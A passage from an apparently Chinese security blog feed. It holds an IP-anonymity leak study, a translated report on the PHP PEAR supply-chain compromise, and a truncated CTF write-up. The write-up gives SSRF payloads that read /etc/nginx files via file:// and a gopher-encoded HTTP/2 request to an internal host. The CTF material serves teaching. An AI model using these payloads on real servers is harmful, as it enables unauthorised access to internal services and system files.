"e6079c5ce56e781a50f4bf853cdb5302e0d8f054":</span>    <span class="token comment" spellcheck="true">#          print(flag)</span></code></pre><p>同样是递归＋Tree的方法获取到结果。</p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
            <tag> Tree </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>IP匿名性研究</title>
      <link href="/2019/02/21/IP%E5%8C%BF%E5%90%8D%E6%80%A7%E7%A0%94%E7%A9%B6/"/>
      <url>/2019/02/21/IP%E5%8C%BF%E5%90%8D%E6%80%A7%E7%A0%94%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<p>IP匿名性研究——Anonymity</p><a id="more"></a><h1 id="IP匿名性研究——Anonymity"><a href="#IP匿名性研究——Anonymity" class="headerlink" title="IP匿名性研究——Anonymity"></a>IP匿名性研究——Anonymity</h1><h2 id="何谓匿名？"><a href="#何谓匿名？" class="headerlink" title="何谓匿名？"></a>何谓匿名？</h2><blockquote><p>匿名定义为<strong>未知姓名或未确定身份</strong>。我们上网时并没有匿名，即使在使用隐私工具如Tor、Bitcoin或VPN的时候。每项服务至少有一条可以用于区分不同用户的信息，无论其为一套IP地址（VPN或Tor）还是一个电子钱包（Bitcoin）。这种信息本身可能不会泄露用户的任何私人信息，但其可与其它相似信息联系起来，最终确定个人的身份。</p><p>VPN虽然不会使得我们完全匿名，但它会极大增强上网时的隐私和安全。</p></blockquote><p>既然不可能做到完全匿名，我们只能提高相对匿名性，从而使得自己在网络中的<strong>隐私度更高</strong>，<strong>安全性更高</strong>。</p><h2 id="一定的匿名性是有必要的"><a href="#一定的匿名性是有必要的" class="headerlink" title="一定的匿名性是有必要的"></a>一定的匿名性是有必要的</h2><p>互联网时代，个人隐私的保护更加复杂与困难，亟待各种保护手段的更新和创新。比如在网络立法层面，目前仍有许多空白，缺乏相应的顶层设计。有必要在个人信息保护、电子商务等领域建立严格健全的法律规定，划定互联网服务商的“禁区”，明确权责，让处在弱势的普通用户拥有知情权、选择权与维权的依据。</p><p>因而在当今这个时代，不论是信息/网络安全从业者，还是普通群众都应该自主地去提高自己的安全意识，通过一些措施防止自己的信息泄露。</p><h2 id="什么因素会泄露你的真实IP信息？"><a href="#什么因素会泄露你的真实IP信息？" class="headerlink" title="什么因素会泄露你的真实IP信息？"></a>什么因素会泄露你的真实IP信息？</h2><p>可以小结出以下因素：</p><ul><li>IPV4地址泄露</li><li>IPV6地址泄露</li><li>DNS泄露</li><li>WebRTC泄露</li><li>HTTPHeader信息泄露</li><li>等等…..</li></ul><h3 id="IPV4泄露"><a href="#IPV4泄露" class="headerlink" title="IPV4泄露"></a>IPV4泄露</h3><blockquote><p>IPv4使用32位（4字节）地址，因此地址空间中只有4,294,967,296（232）个地址。不过，一些地址是为特殊用途所保留的，如专用网络（约1800万个地址）和多播地址（约2.7亿个地址），这减少了可在互联网上路由的地址数量。随着地址不断被分配给最终用户，IPv4地址枯竭问题也在随之产生。基于分类网络、无类别域间路由和网络地址转换的地址结构重构显著地减少了地址枯竭的速度。但在2011年2月3日，在最后5个地址块被分配给5个区域互联网注册管理机构之后，IANA的主要地址池已经用尽。</p></blockquote><p>我们现在常说的IP地址就是指IPV4地址，通常我们在使用浏览器访问web站点时，请求头中会包含我们的IPV4地址，因此可以被服务器获取到我们的IP并记录进入日志。</p><h3 id="IPV6泄露"><a href="#IPV6泄露" class="headerlink" title="IPV6泄露"></a>IPV6泄露</h3><blockquote><p>Internet协议版本6（IPv6）是Internet协议（IP）的最新版本，IP协议是为网络上的计算机提供标识和定位系统并通过Internet路由流量的通信协议。IPv6是由互联网工程任务组（IETF）开发的，用于解决长期以来的IPv4地址耗尽问题。</p><p>除了更大的寻址空间之外，IPv6还提供其他技术优势。特别是，它允许分层地址分配方法，这些方法有助于跨Internet的<a href="https://en.wikipedia.org/wiki/Route_aggregation" target="_blank" rel="noopener">路由聚合</a>，从而限制了<a href="https://en.wikipedia.org/wiki/Routing_table" target="_blank" rel="noopener">路由表</a>的扩展。扩展和简化了多播寻址的使用，并为服务的提供提供了额外的优化。在协议的设计中已经考虑了设备移动性，安全性和配置方面。</p><p>IPv6地址表示为八组，每组四个<a href="https://en.wikipedia.org/wiki/Hexadecimal" target="_blank" rel="noopener">十六进制</a>数字，组以冒号分隔，例如2001：0db8：0000：0042：0000：8a2e：0370：7334，但存在缩写此完整符号的方法。</p></blockquote><p>IPV6是还未普遍使用的一种地址，用于解决长期以来的IPv4地址耗尽问题，通过没有隐藏IPV6也会泄露我们信息。</p><h3 id="DNS泄露"><a href="#DNS泄露" class="headerlink" title="DNS泄露"></a>DNS泄露</h3><p>什么是DNS?</p><blockquote><p>DNS或域名系统用于将域名（如<a href="http://www.astrill.com）转换为数字IP地址，例如" target="_blank" rel="noopener">www.astrill.com）转换为数字IP地址，例如</a> 123.98.12.1在互联网上用于发送数据包。 每当您的计算机需要联系网络上的服务器时，例如当您在浏览器中输入URL时，您的计算机会联系DNS服务器并请求IP地址。大多数互联网服务提供商为他们的客户分配一个DNS服务器，它们用于控制和记录您的互联网活动。</p></blockquote><p>在某些情况下，即使连接到匿名网络，操作系统仍将继续使用其默认DNS服务器，而不是由匿名网络分配给您计算机的匿名DNS服务器。这被称为泄漏。DNS泄漏是主要的隐私威胁，因为匿名网络可能会在私人数据泄露的同时提供错误的安全感。</p><p>当您的DNS请求被泄露时，发送到/从网站发送的实际数据将不被捕获。但它仍然可以向窃听者提供关于您访问的网站的足够信息。它也为DNS病毒打开门户，可用于钓鱼攻击(DNS劫持)。</p><h3 id="WEBRTC泄露"><a href="#WEBRTC泄露" class="headerlink" title="WEBRTC泄露"></a>WEBRTC泄露</h3><blockquote><p>什么是WEBRTC？</p><p>WebRTC（Web Real-Time Communication）是一个支持网页浏览器进行实时语音对话或视频对话的技术，是谷歌2010年以6820万美元收购Global IP Solutions公司而获得的一项技术。2011年5月谷歌开放了WebRTC的源代码，在行业内得到了广泛的支持和应用。</p></blockquote><p>即使您正在使用 VPN，也会出现多个可以泄漏 IP 地址的“意想不到的错误”。它被称为 WebRTC（Web 实时通信）泄漏。</p><p>WebRTC 允许浏览器内部的实时通信。这很方便，但也有一个缺点。即使打开了VPN，WebRTC 也能默认泄漏您的真实地址。WebRTC 协议通过设计实现此目的，即使是最好的 VPN 也无法始终保护自己的信息不被泄露。</p><p>因此，如果使用默认启用 WebRTC 的浏览器，则采取必要的预防措施这一点十分重要。在选择的浏览器中搜索如何关闭 WebRTC，或查找是否存在可安装用来禁用 WebRTC 的 WebRTC 阻止插件。请记住，禁用 WebRTC 可能会导致部分网站（如 Google Hangouts）无法正常工作，因此您可能需要在特定情况下启用它。</p><pre class=" language-payload"><code class="language-payload">Firefox浏览器禁用WebRTC的方法是：在浏览器上输入：about:config。之后搜索：media.peerconnection.enabled。找到它后双击，将其改成 false 即可。Chrome浏览器禁用WebRTC的方法是：在Chrome应用商店里，安装一个名为WebRTC Leak Prevent的扩展，然后选择 Use my Porxy server(if present) 即可。</code></pre><h3 id="HTTPheader泄露"><a href="#HTTPheader泄露" class="headerlink" title="HTTPheader泄露"></a>HTTPheader泄露</h3><p>http请求数据包中的<code>header</code>:</p><pre class=" language-html"><code class="language-html">GET / HTTP/1.1Host: www.4399.comConnection: keep-aliveUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh,en-US;q=0.9,en;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6Cookie: home4399=yes; UM_distinctid=169050f7793431-0062d73fb17ef-b79183d-144000-169050f7794319; CNZZDATA30039538=cnzz_eid%3D1853484585-1550564275-%26ntime%3D1550564275If-None-Match: W/"5c6b5dba-2a86c"If-Modified-Since: Tue, 19 Feb 2019 01:36:58 GMT</code></pre><p>可见，通过<code>header</code>中的<code>Accept-Language</code>,<code>User-Agent</code>泄露了一些信息，如：我们使用的是中文和英文，用户详细UA信息等等。</p><p>一般情况下我们也可以使用<code>X-Forwarded-For</code>,<code>X-Client-IP</code>,<code>X-Real-IP</code>,<code>X-Remote-IP</code>等请求属性伪造IP从而骗过服务器的IP识别。</p><h2 id="IP匿名性测试"><a href="#IP匿名性测试" class="headerlink" title="IP匿名性测试"></a>IP匿名性测试</h2><p>我们接下来基于windows10和parrot linux平台代理进行IP匿名性测试，代理软件是最普通的<code>小飞机(ssr)</code>，值得一提的是<code>Electron版小飞机</code>还不错，跨平台。</p><blockquote><p>什么是Parrot linux?</p><p>Parrot Security OS（简称作「ParrorSec」或「Parrot（鹦鹉）」）是一个基于 Debian 面向安全的 GNU/<a href="https://www.linuxprobe.com/" target="_blank" rel="noopener">Linux</a> 发行版。它提供了诸多用于安全测试、数字取证、软件开发及隐私防护的专业工具。</p><p>Parrot与kali类似，但比kali多很多工具。在我目前使用的情况看来，同等配置下Parrot要比kali美观流畅。</p></blockquote><p>使用以下三个网址进行匿名性检测：    </p><ul><li><a href="https://www.astrill.com/zh/vpn-leak-test" target="_blank" rel="noopener">https://www.astrill.com/zh/vpn-leak-test</a></li><li><a href="https://whoer.net/zh" target="_blank" rel="noopener">https://whoer.net/zh</a></li><li><a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a></li></ul><p>通过测试直观地显现出不同平台，不同情况下的匿名程度，从而得到其差别。</p><h3 id="Windows-10平台"><a href="#Windows-10平台" class="headerlink" title="Windows 10平台"></a>Windows 10平台</h3><p>在我的物理机<code>windows 10</code>本地启用<code>小飞机</code>之后，我们分别从几个测试平台获得了IP匿名性测试结果：</p><p><code>astrill.com</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219200332.png" alt=""></p><p><code>whoer.net</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219200512.png" alt=""></p><p><code>ceye.io</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219193744.png" alt=""></p><p>通过伪造httpheader中的<code>x-real-ip</code>我们可以给自己加上一层伪装，但是并不能逃过检测：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219194704.png" alt=""></p><p>由以上三个结果可以了解到，单纯在win10上使用小飞机代理时，astrill和whoer平台的结果共同反映出了DNS和WEBRTC的泄露，以及页面语言，当地时间等信息。而ceye的结果更是直接得到了我们的真实IP，仅凭上述信息已经可以精确知道我是哪个村的人了(开个玩笑hhh)，因此在win10上小飞机的匿名性堪忧。</p><h3 id="Parrot-Linux平台"><a href="#Parrot-Linux平台" class="headerlink" title="Parrot Linux平台"></a>Parrot Linux平台</h3><p>在我的虚拟机<code>Parrot Linux</code>启用<code>小飞机</code>之后，我们分别从几个测试平台获得了IP匿名性测试结果：</p><p><code>astrill.com</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219195503.png" alt=""></p><p><code>whoer.net</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219195626.png" class="lazyload"></p><p><code>ceye.io</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219195409.png" class="lazyload"></p><p>由以上三个结果可以看到，没有出现与我所在地有关的信息，检测到的IP也不是我的真实IP(117.170.**<em>.\</em>**)，而是代理服务器的IP地址，没有出现DNS和WEBRTC泄露，因而可以看出<code>Parrot linux</code>作为一个面向安全测试的linux发行版的匿名性是十分之高的，相对于win10匿名性要提高了不少。</p><h3 id="以Parrot作为跳板，为win10代理"><a href="#以Parrot作为跳板，为win10代理" class="headerlink" title="以Parrot作为跳板，为win10代理"></a>以Parrot作为跳板，为win10代理</h3><p>既然Parrot的匿名性比较好，那我们把parrot作为跳板（parrot上的小飞机允许局域网连接），用win10连接运行在parrot上的小飞机代理，会有什么结果呢？</p><p><code>whoer.net</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190219201252.png" class="lazyload"></p><p>ceye.io和astrill检测是正常的，没有泄露信息，但是从whoer.net的结果看来：泄露了时区，语言等信息。最关键的是WEBRTC直接泄露出了我们的真实IP地址和内网地址。</p><blockquote><p>Parrot OS中自带Tor网络，和匿名模式，以上测试均在未开启Tor网络和匿名模式情况下测试。</p><p>总的来说，单纯地使用Parrot还是很香很匿名的！</p></blockquote><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>当今的科技发展迅速，隐私信息也显得越来越重要，通过一部分真实的蛛丝马迹，就可能还原出精准的信息模型。IPV6泄露，DNS泄露，WEBRTC泄露，HTTPheader泄露都可能导致你在网络上的匿名性降低，可能对于普通人来说，这只是无关紧要的事情，但对于诸位安全从业者来说，其中利弊不用多言。</p><blockquote><p>注明: <a href="https://mp.weixin.qq.com/s/Otk44j7UNbT_FX9mXq6o4Q" target="_blank" rel="noopener">此文章首发于安恒网络空间安全讲武堂公众号</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> IP匿名性 </tag>
            
            <tag> ParrotOS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php_pear_was_attacked</title>
      <link href="/2019/01/31/php-pear-was-attacked/"/>
      <url>/2019/01/31/php-pear-was-attacked/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><blockquote><p>译文声明：</p><p>本文是翻译文章，文章原作者<a href="https://thehackernews.com/p/authors.html" target="_blank" rel="noopener">Mohit Kumar</a>，文章来源：<a href="https://thehackernews.com/2019/01/php-pear-hacked.html" target="_blank" rel="noopener">https://thehackernews.com/2019/01/php-pear-hacked.html</a></p></blockquote><h1 id="PHP-PEAR网站被黑且其官方软件包管理器被恶意篡改"><a href="#PHP-PEAR网站被黑且其官方软件包管理器被恶意篡改" class="headerlink" title="PHP PEAR网站被黑且其官方软件包管理器被恶意篡改"></a>PHP PEAR网站被黑且其官方软件包管理器被恶意篡改</h1><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190130104752.png" alt=""></p><blockquote><p>小心！如果您在过去6个月内从PHP官方网站下载了PHP PEAR包管理器，我们只能很遗憾对您说您的服务器可能已经成为肉鸡。</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上周，PEAR的维护人员发现有人<strong>恶意替换了原来的PHP PEAR包管理器（go-pear.phar）</strong>，且黑客在核心PEAR文件系统中使用了篡改后的版本，在此之后维护人员迅速关闭了PEAR的官方网站（pear-php.net）。</p><p>尽管PEAR开发人员还在分析恶意程序包，但团队在2019年1月19日迅速发布的安全公告证实，被黑客入侵的网站服务放置了受恶意代码污染的安装文件至少半年之久，可想而知有多少人下载了被污染的安装包。</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190130105824.png" alt=""></p><h2 id="PHP-PEAR是什么？"><a href="#PHP-PEAR是什么？" class="headerlink" title="PHP-PEAR是什么？"></a>PHP-PEAR是什么？</h2><p>PHP扩展和应用程序存储库（PEAR）是一个社区驱动的框架和分发系统，它使得任何人都可以搜索和下载使用PHP编程语言编写的免费库。这些开源库（或许称之为软件包更为恰当）允许开发人员在其项目和网站中轻松添加其他功能，包括身份验证，缓存，加密，Web服务等等。</p><p>当您下载用于Unix / Linux / BSD系统的PHP软件时，PEAR下载管理器（go-pear.phar）已预先安装，而Windows和Mac OS X用户在必要的时侯需手动安装该组件。</p><p>由于许多网络托管公司（包括共享托管服务提供商）也允许其用户安装和运行PEAR，因此这种最新的安全漏洞可能会<strong>影响大量网站及其访问者</strong>。</p><h2 id="PEAR-团队声明"><a href="#PEAR-团队声明" class="headerlink" title="PEAR 团队声明"></a>PEAR 团队声明</h2><blockquote><p>“如果您在过去六个月之内已经下载了这个<code>go-pear.phar</code>，那么您应该从<code>GitHub（pear / pearweb_phars）</code>获取相同发行版本的新副本并比较其文件哈希值。如果不同，您可能会有安装受感染的文件的风险”，PEAR官方网站上的说明如上。</p></blockquote><p>根据PEAR维护人员的说法，该团队目前正在进行追踪、溯源调查，以确定攻击的程度以及攻击者是如何在这么早的时期就能够攻破服务器。</p><p>而现在可以在Github上获取到净化后的版本<code>pearweb_phars-1.10.10</code>，此前在服务器<code>http：//pear.php.net</code>上受到污染的版本是<code>v1.10.9</code>，PEAR团队也重新发布了未受污染的<code>go-pear.phar-v1.10.9</code>，并且会包含有每个不同<code>phar</code>的单独GPG签名文件，用以验明其正确性。</p><p>后来开发人员进行了进一步的通知说明，证实只有<code>http://pear.php.net</code>服务器上的副本受到了影响，而且<code>go-pear.phar</code>的GitHub副本并没有替换为污染后的文件。</p><p>因此所有在过去六个月内从官方网站下载过安装文件<code>go-pear.phar</code>的PHP / PEAR用户<strong>都应该认识</strong>到自己有被黑客侵害的风险，并且最好替换文件为Github上的纯净版本。</p><h2 id="PEAR-团队针对此次供应链污染的部分调查信息"><a href="#PEAR-团队针对此次供应链污染的部分调查信息" class="headerlink" title="PEAR 团队针对此次供应链污染的部分调查信息"></a>PEAR 团队针对此次供应链污染的部分调查信息</h2><p><strong>更新</strong> -  PEAR团队发布了有关最近安全事件的更多详细信息，解释了在2018年12月20日最后一次正式文件发布后，其服务器上发现<code>go-pear.phar</code>被污染的详细状况。</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190130111806.png" alt=""></p><p>PEAR 团队在分析了包管理器的污染版本文件之后，发现恶意代码模块<code>通过Perl向IP 104.131.154.154生成反向shell</code>，这意味着受感染的服务器将生成后门，允许攻击者完全控制它们，包括安装应用程序，运行恶意代码，窃取敏感数据的能力。</p><p>根据<a href="https://blog.dcso.de/php-pear-software-supply-chain-attack/" target="_blank" rel="noopener">DCSO上德国网络安全组织对此次供应链污染的分析报告</a>得知：服务器IP地址<code>104.131.154.154</code>指向一个web域名<code>bestlinuxgames [.] com</code>，该服务器被认为是黑客使用的一台受感染后主机（肉鸡/C2服务器）。</p><blockquote><p>“该IP已被证实与此次供应链污染有关，但没有发现其他违规行为。<code>install-pear-nozlib.phar</code>软件包是正常的，GitHub上的<code>go-pear.phar</code>文件也是正常的，可以将任何可疑的样本哈希与正确的MD5值进行校验。”；</p><p>“因此，假如您在12/20之前下载了<code>go-pear.phar</code>用以在您的系统上安装PEAR包，那么您<strong>应该担心</strong>自己是否会成为肉鸡，特别是当您的系统具有可用的<code>sh</code>和<code>perl</code>的时候，我们并没有具体证据去确认您是否下载了被感染的文件，但保险起见还是希望您能好好检查一下您的系统。”；</p><p>“另外还需要注意的是，这不会污染使用PEAR安装的程序包…它污染的是初始安装PEAR安装程序的<code>go-pear.phar</code>可执行文件，即使用<code>pear</code>命令安装的各种PEAR包<strong>不受</strong>影响。”；</p><p>PEAR 团队在一系列推文中的表示如上。</p></blockquote><p>PS：当今的供应链污染事件越来越多，谨慎小心方能驶得万年船。</p>]]></content>
      
      
      <categories>
          
          <category> 译文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 资讯 </tag>
            
            <tag> 译文 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ssrf_by_http2_and_gopher</title>
      <link href="/2019/01/31/ssrf-by-http2-and-gopher/"/>
      <url>/2019/01/31/ssrf-by-http2-and-gopher/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="pwnhub-pink-friend"><a href="#pwnhub-pink-friend" class="headerlink" title="pwnhub-pink-friend"></a>pwnhub-pink-friend</h1><blockquote><p>参考链接：</p><p><a href="http://f1sh.site/2019/01/30/pwnhub-pink-friend-writeup/" target="_blank" rel="noopener">http://f1sh.site/2019/01/30/pwnhub-pink-friend-writeup/</a></p><p><a href="https://www.virzz.com/2019/01/29/pwnhub_2019_pink_friend_http2.html" target="_blank" rel="noopener">https://www.virzz.com/2019/01/29/pwnhub_2019_pink_friend_http2.html</a></p></blockquote><p>题目链接：<a href="https://40.73.33.181/index.php" target="_blank" rel="noopener">https://40.73.33.181/index.php</a></p><p>source code:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Can not parse url: '</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span> <span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>先ssrf读nginx配置文件：</p><ul><li>/etc/nginx/nginx.conf</li><li>/etc/nginx/sites-enabled/default</li><li>/var/log/nginx/access.log;</li><li>/var/log/nginx/error.log</li></ul><p><code>view-source:https://40.73.33.181/index.php?url=file:///etc/nginx/sites-enabled/default</code></p><p><code>view-source:https://40.73.33.181/index.php?url=file:///etc/nginx/nginx.conf</code></p><pre class=" language-nginx"><code class="language-nginx"><span class="token keyword">user</span> www<span class="token operator">-</span>data<span class="token punctuation">;</span><span class="token keyword">worker_processes</span> auto<span class="token punctuation">;</span><span class="token keyword">pid</span> <span class="token operator">/</span>run<span class="token operator">/</span>nginx<span class="token punctuation">.</span><span class="token keyword">pid</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>modules<span class="token operator">-</span>enabled<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">.</span>conf<span class="token punctuation">;</span><span class="token keyword">events</span> <span class="token punctuation">{</span>    <span class="token keyword">worker_connections</span> <span class="token number">768</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># multi_accept on;</span><span class="token punctuation">}</span><span class="token keyword">http</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># Basic Settings</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">sendfile</span> on<span class="token punctuation">;</span>    <span class="token keyword">tcp_nopush</span> on<span class="token punctuation">;</span>    <span class="token keyword">tcp_nodelay</span> on<span class="token punctuation">;</span>    <span class="token keyword">keepalive_timeout</span> <span class="token number">65</span><span class="token punctuation">;</span>    <span class="token keyword">types_hash_max_size</span> <span class="token number">2048</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># server_tokens off;</span>    <span class="token comment" spellcheck="true"># server_names_hash_bucket_size 64;</span>    <span class="token comment" spellcheck="true"># server_name_in_redirect off;</span>    <span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>mime<span class="token punctuation">.</span><span class="token keyword">types</span><span class="token punctuation">;</span>    <span class="token keyword">default_type</span> application<span class="token operator">/</span>octet<span class="token operator">-</span>stream<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># SSL Settings</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">ssl_protocols</span> TLSv1 TLSv1<span class="token number">.1</span> TLSv1<span class="token number">.2</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true"># Dropping SSLv3, ref: POODLE</span>    <span class="token keyword">ssl_prefer_server_ciphers</span> on<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># Logging Settings</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">access_log</span> <span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>access<span class="token punctuation">.</span>log<span class="token punctuation">;</span>    <span class="token keyword">error_log</span> <span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>error<span class="token punctuation">.</span>log<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># Gzip Settings</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">gzip</span> on<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># gzip_vary on;</span>    <span class="token comment" spellcheck="true"># gzip_proxied any;</span>    <span class="token comment" spellcheck="true"># gzip_comp_level 6;</span>    <span class="token comment" spellcheck="true"># gzip_buffers 16 8k;</span>    <span class="token comment" spellcheck="true"># gzip_http_version 1.1;</span>    <span class="token comment" spellcheck="true"># gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># Virtual Host Configs</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>conf<span class="token punctuation">.</span>d<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">.</span>conf<span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>sites<span class="token operator">-</span>enabled<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">#server {</span>    <span class="token comment" spellcheck="true">#    listen 8080</span>    <span class="token comment" spellcheck="true">#    location /flag {</span>    <span class="token comment" spellcheck="true">#        proxy_pass 172.20.0.3:8080</span>    <span class="token comment" spellcheck="true">#    }</span>    <span class="token comment" spellcheck="true">#}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#mail {</span><span class="token comment" spellcheck="true">#    # See sample authentication script at:</span><span class="token comment" spellcheck="true">#    # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true">#    # auth_http localhost/auth.php;</span><span class="token comment" spellcheck="true">#    # pop3_capabilities "TOP" "USER";</span><span class="token comment" spellcheck="true">#    # imap_capabilities "IMAP4rev1" "UIDPLUS";</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true">#    server {</span><span class="token comment" spellcheck="true">#        listen     localhost:110;</span><span class="token comment" spellcheck="true">#        protocol   pop3;</span><span class="token comment" spellcheck="true">#        proxy      on;</span><span class="token comment" spellcheck="true">#    }</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true">#    server {</span><span class="token comment" spellcheck="true">#        listen     localhost:143;</span><span class="token comment" spellcheck="true">#        protocol   imap;</span><span class="token comment" spellcheck="true">#        proxy      on;</span><span class="token comment" spellcheck="true">#    }</span><span class="token comment" spellcheck="true">#}</span></code></pre><p>然后可以从nginx.conf得知flag线索<code>172.20.0.3:8080</code>，通过gopher协议构造符合HTTP2的payload访问指定地址，获取返回的HTTP2的原生数据（需要了解<a href="https://www.codercto.com/a/34433.html" target="_blank" rel="noopener">HTTP2</a>以及<a href="https://www.codercto.com/a/34433.html" target="_blank" rel="noopener">gopher协议</a>的知识）。</p><pre class=" language-payload"><code class="language-payload">--payload:/index.php?url=gopher://172.20.0.3:8080/_PRI%2520%252A%2520HTTP/2.0%250D%250A%250D%250ASM%250D%250A%250D%250A%2500%2500%2500%2504%2500%2500%2500%2500%2500%2500%2500%2515%2501%2505%2500%2500%2500%2501%2582%2586%2584A%258A%2508%259D%255C%250B%2581p%25DCx%250F%2503%2560%2581%25EFS%2581%25F9</code></pre><p>返回的数据:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190131000835.png" alt=""></p><p>可以将返回的数据按HTTP2协议的格式解析，或者利用一种巧妙的方法，即把返回数据放在使用socket模拟的服务器上，直接用<code>curl --http2-prior-knowledge</code>访问，获得写在返回头部<code>set-cookie</code>的flag：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: UTF-8 -*-</span><span class="token comment" spellcheck="true"># From F1sh's blog</span><span class="token keyword">import</span> socketa <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"response.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>s 